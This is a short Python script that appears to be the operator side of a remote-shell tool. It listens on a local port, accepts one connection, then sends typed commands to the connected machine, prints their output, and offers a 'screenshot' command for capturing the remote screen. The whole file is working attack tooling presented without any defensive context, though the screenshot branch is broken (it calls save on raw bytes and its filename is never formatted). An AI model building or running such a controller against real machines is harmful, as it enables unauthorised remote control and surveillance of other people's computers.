# import modules
import socket
import os

# define host and port
host = '127.0.0.1'
port = 8080


# start socket object
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind server to host and port
server.bind((host, port))

# listen for connections
server.listen(1)
print('[-] Waiting for connections...')

# accept connetion
client, addr = server.accept()
print(f'\n\033[32m[+]\033[m Connected to {addr[0]} on port {addr[1]}')


# shell session
while True:
    comm = input(f'\n\033[1m*shell*\033[m ~ {addr[0]}:{addr[1]} >> ').lower().strip()
    if comm == 'close':
        break
    elif comm == '':
        pass
    elif comm == 'clear':
        os.system('clear')
    elif comm == 'screenshot':
        count = 0
        while True:
            shot = client.recv(4096)
            if not shot:
                break
            shot.save('screenshot{count}.png')
            count += 1
    else:
        client.send(comm.encode())
        output = client.recv(1024).decode()
        print(f'\n{output}')

server.close()
